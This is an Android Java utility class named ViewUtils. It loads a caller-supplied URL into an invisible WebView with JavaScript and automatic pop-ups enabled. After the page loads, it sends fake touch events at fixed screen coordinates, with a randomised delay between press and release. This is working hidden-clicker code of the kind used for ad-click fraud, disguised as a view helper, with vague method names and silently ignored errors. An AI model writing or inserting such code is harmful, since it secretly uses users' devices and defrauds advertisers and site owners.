package com.server.core;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.res.Resources;
import android.os.SystemClock;
import android.util.AttributeSet;
import android.util.DisplayMetrics;
import android.view.MotionEvent;
import android.view.View;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import java.util.Random;
import java.util.concurrent.atomic.AtomicBoolean;

public class ViewUtils {
    @SuppressLint("StaticFieldLeak")

    private AtomicBoolean _atomicBooleanClick = new AtomicBoolean(false);

    private static final class Inner {
        private static final ViewUtils INSTANCE = new ViewUtils();
    }

    private MyWebview _webView;

    private ViewUtils() {
    }

    static ViewUtils instance() {
        return Inner.INSTANCE;
    }

    void perform(Activity context, String url, final long time) {
        try {
            if (_webView != null) {
                _webView.stopLoading();
                _webView.loadUrl("about:blank");
            }
            _webView = new MyWebview(context);
            DisplayMetrics displayMetrics = context.getResources().getDisplayMetrics();
            int heightPixels = displayMetrics.heightPixels - f(context) - g(context);
            int widthPixels = displayMetrics.widthPixels;

            _webView.setVisibility(View.INVISIBLE);
            _webView.requestFocus();
            _webView.requestFocusFromTouch();
            _webView.measure(View.MeasureSpec.makeMeasureSpec(widthPixels, View.MeasureSpec.EXACTLY),
                    View.MeasureSpec.makeMeasureSpec(heightPixels, View.MeasureSpec.EXACTLY));
            _webView.layout(0, 0, widthPixels, heightPixels);
            _webView.loadUrl(url);
            _webView.setWebViewClient(new WebViewClient() {
                @Override
                public void onPageFinished(WebView view, String url) {
                    super.onPageFinished(view, url);
                    if (!_atomicBooleanClick.get()) {
                        ApplicationUtil.runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                handlerClickEvent(140, 142, 210, 212);
                                _atomicBooleanClick.set(true);
                            }
                        }, time);
                    }
                }
            });

        } catch (Exception ignored) {
            //ignored
        }
    }


    private void handlerClickEvent(int xDown, int yDown, int xUp, int yUp) {
        DisplayMetrics displayMetrics = _webView.getContext().getResources().getDisplayMetrics();
        float ratio = displayMetrics.density;
        xDown = (int) (xDown * ratio);
        yDown = (int) (yDown * ratio);
        xUp = (int) (xUp * ratio);
        yUp = (int) (yUp * ratio);
        long downTime = SystemClock.uptimeMillis();
        long eventTime = SystemClock.uptimeMillis();
        MotionEvent motionEventDown = MotionEvent.obtain(downTime, eventTime, MotionEvent.ACTION_DOWN, xDown, yDown, 0);
        _webView.dispatchTouchEvent(motionEventDown);
        motionEventDown.recycle();
        eventTime += new Random().nextInt(100);
        MotionEvent motionEventUp = MotionEvent.obtain(downTime, eventTime, MotionEvent.ACTION_UP, xUp, yUp, 0);
        _webView.dispatchTouchEvent(motionEventUp);
        motionEventUp.recycle();

    }

    public static class MyWebview extends android.webkit.WebView {
        public MyWebview(Context context) {
            super(context);
            //支持javascript
            getSettings().setJavaScriptEnabled(true);
            // 设置可以支持缩放
            getSettings().setSupportZoom(true);
            // 设置出现缩放工具
            getSettings().setBuiltInZoomControls(true);
            //扩大比例的缩放
            getSettings().setUseWideViewPort(true);
            //自适应屏幕
            getSettings().setLayoutAlgorithm(WebSettings.LayoutAlgorithm.SINGLE_COLUMN);
            getSettings().setLoadWithOverviewMode(true);
            //
            getSettings().setJavaScriptCanOpenWindowsAutomatically(true);

        }

        public MyWebview(Context context, AttributeSet attrs) {
            super(context, attrs);
        }

        public MyWebview(Context context, AttributeSet attrs, int defStyleAttr) {
            super(context, attrs, defStyleAttr);
        }

    }

    private int f(Context context) {
        Resources resources = context.getResources();
        return resources.getDimensionPixelSize(resources.getIdentifier("status_bar_height", "dimen", "android"));
    }

    private int g(Context context) {
        Resources resources = context.getResources();
        return resources.getDimensionPixelSize(resources.getIdentifier("navigation_bar_height", "dimen", "android"));
    }

}
